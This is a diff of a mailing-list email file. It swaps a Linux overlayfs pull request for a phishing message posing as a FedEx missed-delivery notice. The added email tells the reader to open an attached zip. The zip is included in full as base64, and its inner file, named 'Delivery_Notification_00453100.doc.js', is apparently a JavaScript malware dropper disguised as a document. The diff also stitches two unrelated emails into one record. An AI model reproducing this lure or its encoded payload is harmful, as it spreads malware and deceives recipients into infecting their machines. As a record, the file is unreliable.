@@ -1,44 +1,156 @@
-From: Miklos Szeredi <miklos@szeredi.hu>
-Subject: [GIT PULL] overlayfs fixes for 4.7-rc5
-Date: Sun, 3 Jul 2016 10:32:08 +0200
-Message-ID: <20160703083208.GC11993@veci.piliscsaba.szeredi.hu>
+From: "FedEx SmartPost" <carl.pollard@hotel.apart-dom.com>
+Subject: We could not deliver your parcel, #00453100
+Date: Tue, 5 Jul 2016 16:18:18 +0300
+Message-ID: <c6e676043d2244eb1b1e76db86c7473d@hotel.apart-dom.com>
+Reply-To: "FedEx SmartPost" <carl.pollard@hotel.apart-dom.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: multipart/mixed;
+	boundary="b1_d8c9dfd957737b69b88c00059c24667f"
+Content-Transfer-Encoding: 8bit
 Return-path: <linux-unionfs-owner@vger.kernel.org>
-Received: from mail-wm0-f66.google.com ([74.125.82.66]:34724 "EHLO
-	mail-wm0-f66.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1751222AbcGCIcP (ORCPT
+Received: from relay.unihost.com ([37.235.55.139]:54242 "EHLO
+	relay0.unihost.com" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+	with ESMTP id S1751105AbcGENYD (ORCPT
 	<rfc822;linux-unionfs@vger.kernel.org>);
-	Sun, 3 Jul 2016 04:32:15 -0400
-Received: by mail-wm0-f66.google.com with SMTP id 187so14913631wmz.1
-        for <linux-unionfs@vger.kernel.org>; Sun, 03 Jul 2016 01:32:13 -0700 (PDT)
-Content-Disposition: inline
+	Tue, 5 Jul 2016 09:24:03 -0400
+Received: from master038.unihost.com (static.213-239-227-58.clients.your-server.de [213.239.227.58])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by relay0.unihost.com (Postfix) with ESMTPS id 4E152629FD
+	for <linux-unionfs@vger.kernel.org>; Tue,  5 Jul 2016 15:18:51 +0200 (CEST)
+Received: from apartdom by master038.unihost.com with local (Exim 4.82)
+	(envelope-from <minihotel4@gmail.com>)
+	id 1bKQF1-001LWR-08
+	for linux-unionfs@vger.kernel.org; Tue, 05 Jul 2016 16:18:19 +0300
 Sender: linux-unionfs-owner@vger.kernel.org
 List-Id: linux-unionfs@vger.kernel.org
-To: Linus Torvalds <torvalds@linux-foundation.org>
-Cc: linux-kernel@vger.kernel.org, linux-fsdevel@vger.kernel.org, linux-unionfs@vger.kernel.org
+To: linux-unionfs@vger.kernel.org
 
-Hi Linus,
+--b1_d8c9dfd957737b69b88c00059c24667f
+Content-Type: text/plain; charset=us-ascii
 
-Please pull from:
+Dear Customer,
 
-  git://git.kernel.org/pub/scm/linux/kernel/git/mszeredi/vfs.git overlayfs-linus
+Courier was unable to deliver the parcel to you.
+Please, open email attachment to print shipment label.
 
-This contains fixes for a dentry leak, a regression in 4.6 noticed by Docker
-users and missing write access checking in truncate.
+Warm regards,
+Carl Pollard,
+Support Agent.
 
-Thanks,
-Miklos
 
----
-Miklos Szeredi (2):
-      ovl: fix dentry leak for default_permissions
-      ovl: get_write_access() in truncate
+--b1_d8c9dfd957737b69b88c00059c24667f
+Content-Type: application/zip; name="Delivery_Notification_00453100.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Delivery_Notification_00453100.zip
 
-Vivek Goyal (1):
-      ovl: warn instead of error if d_type is not supported
+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
+AQBTAAAAPRcAAAAA
 
----
- fs/overlayfs/inode.c | 29 ++++++++++++++++++++++++++---
- fs/overlayfs/super.c | 12 +++++++-----
- 2 files changed, 33 insertions(+), 8 deletions(-)
+
+--b1_d8c9dfd957737b69b88c00059c24667f--
